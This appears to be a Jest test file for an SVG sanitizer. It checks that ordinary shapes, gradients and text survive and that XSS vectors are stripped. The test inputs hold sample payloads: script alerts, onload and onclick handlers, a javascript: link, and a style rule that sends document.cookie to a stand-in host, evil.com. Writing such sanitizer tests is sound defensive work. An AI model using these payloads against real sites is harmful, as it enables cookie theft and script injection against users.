import { sanitizeSvg } from './sanitize-svg';

// sanitize-html is an HTML serializer: it lowercases all tags/attributes
// (viewBox→viewbox, clipPath→clippath, linearGradient→lineargradient) and
// expands self-closing tags (<path/>→<path></path>).
// Tests check for content presence/absence, not exact string equality.

describe('sanitizeSvg', () => {
  describe('valid SVG is preserved', () => {
    it('should preserve the svg root element', () => {
      const result = sanitizeSvg(
        '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"></svg>'
      );
      expect(result).toContain('<svg');
      expect(result).toContain('viewbox="0 0 24 24"');
      expect(result).toContain('xmlns="http://www.w3.org/2000/svg"');
    });

    it('should preserve common shape elements and their attributes', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<path d="M5 12h14" fill="none" stroke="currentColor"/>' +
        '<circle cx="12" cy="12" r="4" fill="currentColor"/>' +
        '<rect x="2" y="2" width="20" height="20" rx="2"/>' +
        '<ellipse cx="12" cy="12" rx="10" ry="6"/>' +
        '<line x1="0" y1="0" x2="24" y2="24" stroke="currentColor"/>' +
        '<polyline points="0,0 12,24 24,0"/>' +
        '<polygon points="12,2 22,22 2,22"/>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).toContain('<path d="M5 12h14"');
      expect(result).toContain('<circle cx="12" cy="12" r="4"');
      expect(result).toContain(
        '<rect x="2" y="2" width="20" height="20" rx="2"'
      );
      expect(result).toContain('<ellipse cx="12" cy="12" rx="10" ry="6"');
      expect(result).toContain('<line x1="0" y1="0" x2="24" y2="24"');
      expect(result).toContain('<polyline points="0,0 12,24 24,0"');
      expect(result).toContain('<polygon points="12,2 22,22 2,22"');
    });

    it('should preserve grouping and presentation attributes', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<g fill="none" stroke="currentColor" stroke-width="2" opacity="0.5" transform="translate(2,2)">' +
        '<path d="M5 12h14" stroke-linecap="round" stroke-linejoin="round" fill-rule="evenodd" clip-rule="evenodd"/>' +
        '</g>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).toContain('<g fill="none"');
      expect(result).toContain('stroke-width="2"');
      expect(result).toContain('opacity="0.5"');
      expect(result).toContain('transform="translate(2,2)"');
      expect(result).toContain('stroke-linecap="round"');
      expect(result).toContain('fill-rule="evenodd"');
      expect(result).toContain('clip-rule="evenodd"');
    });

    it('should preserve gradient definitions', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<defs>' +
        '<linearGradient id="grad1" x1="0" y1="0" x2="1" y2="0">' +
        '<stop offset="0%" stop-color="#000"/>' +
        '<stop offset="100%" stop-color="#fff"/>' +
        '</linearGradient>' +
        '</defs>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).toContain('<lineargradient');
      expect(result).toContain('id="grad1"');
      expect(result).toContain('x1="0"');
      expect(result).toContain('<stop offset="0%" stop-color="#000"');
      expect(result).toContain('<stop offset="100%" stop-color="#fff"');
    });

    it('should preserve text elements', () => {
      const svg =
        '<svg viewBox="0 0 100 50">' +
        '<text x="10" y="30" fill="currentColor" font-size="16" text-anchor="middle">' +
        '<tspan x="10" dy="1.2">Hello</tspan>' +
        '</text>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).toContain('<text x="10" y="30"');
      expect(result).toContain('font-size="16"');
      expect(result).toContain('text-anchor="middle"');
      expect(result).toContain('<tspan x="10" dy="1.2">Hello</tspan>');
    });

    it('should preserve accessibility attributes on svg', () => {
      const svg =
        '<svg viewBox="0 0 24 24" role="img" aria-label="Icon" aria-hidden="true"></svg>';
      const result = sanitizeSvg(svg);
      expect(result).toContain('role="img"');
      expect(result).toContain('aria-label="Icon"');
      expect(result).toContain('aria-hidden="true"');
    });

    it('should preserve clipPath element', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<defs>' +
        '<clipPath id="clip1"><rect x="0" y="0" width="12" height="24"/></clipPath>' +
        '</defs>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).toContain('<clippath');
      expect(result).toContain('id="clip1"');
      expect(result).toContain('<rect');
    });
  });

  describe('XSS vectors are stripped', () => {
    it('should remove script tags and their content', () => {
      const svg =
        '<svg viewBox="0 0 24 24"><script>alert("xss")</script></svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
    });

    it('should remove style tags and their content', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<style>svg { background: url("https://evil.com/steal?c=" + document.cookie) }</style>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('<style');
      expect(result).not.toContain('evil.com');
    });

    it('should remove foreignObject', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<foreignObject width="100%" height="100%">' +
        '<div xmlns="http://www.w3.org/1999/xhtml"><script>alert("xss")</script></div>' +
        '</foreignObject>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('foreignObject');
      expect(result).not.toContain('foreignobject');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
    });

    it('should strip event handler attributes', () => {
      const svg =
        '<svg viewBox="0 0 24 24" onload="alert(1)">' +
        '<path d="M5 12h14" onclick="alert(2)" onerror="alert(3)"/>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('onload');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onerror');
    });

    it('should strip xlink:href attribute', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<use xlink:href="javascript:alert(1)"/>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('xlink:href');
      expect(result).not.toContain('javascript');
    });
  });

  describe('unknown tags and attributes are stripped', () => {
    it('should strip unknown SVG tags but keep allowed children', () => {
      const svg =
        '<svg viewBox="0 0 24 24">' +
        '<animate attributeName="fill" from="red" to="blue"/>' +
        '<path d="M5 12h14"/>' +
        '</svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('<animate');
      expect(result).toContain('<path');
    });

    it('should strip data attributes', () => {
      const svg =
        '<svg viewBox="0 0 24 24" data-id="icon"><path d="M5 12h14" data-name="arrow"/></svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('data-id');
      expect(result).not.toContain('data-name');
      expect(result).toContain('<path');
    });

    it('should strip unknown attributes from known tags', () => {
      const svg =
        '<svg viewBox="0 0 24 24"><path d="M5 12h14" focusable="false" tabindex="0"/></svg>';
      const result = sanitizeSvg(svg);
      expect(result).not.toContain('focusable');
      expect(result).not.toContain('tabindex');
      expect(result).toContain('<path d="M5 12h14"');
    });
  });

  describe('edge cases', () => {
    it('should return empty string for empty input', () => {
      expect(sanitizeSvg('')).toBe('');
    });

    it('should strip non-SVG tags entirely', () => {
      const result = sanitizeSvg('<div><p>Not SVG</p></div>');
      expect(result).not.toContain('<div');
      expect(result).not.toContain('<p');
    });
  });
});
